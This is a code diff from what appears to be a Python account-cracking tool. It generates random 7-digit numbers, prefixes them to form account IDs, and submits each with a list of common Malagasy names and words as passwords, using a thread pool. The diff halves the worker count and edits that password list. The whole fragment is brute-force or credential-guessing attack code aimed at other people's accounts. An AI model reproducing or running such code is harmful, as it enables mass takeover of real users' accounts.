@@ -433,7 +433,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=60) as ennic:     
+                with tred(max_workers=30) as ennic:     
                         clear()
                         
                         tl = str(len(user))
@@ -443,7 +443,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'fitiavana','faneva','ravaka','faniry','sarobidy','mamiko','malalako','malala','mamako','vadiko','niaina','randria','anjara','solofo','safidy','nantenaina','tantely','mihary','nomena','mihary','tanjona','anjara','rakoto','sitraka','zanako','felana','tantely','sarika','papako','milely','fanantenana','valisoa','lalatiana','niaina','faniry','nilaina','mihary','tahina','fitahina','fifaliana','fitahiana','anjara']
+                                passlist = [psx,ids,'fitiavana','malala','mamako','vadiko','niaina','randria','faniry','ravaka','safidy','nantenaina','tantely','tsiresy','nomena','rakotomalala','tanjona','mamiko','rakoto','malalako','faneva','felana','tantely','sarika','papako','milely','fanantenana','valisoa','lalatiana','niaina','faniry','nilaina','mihary','tahina','fitahina','fifaliana','fitahiana','anjara']
                                 ennic.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
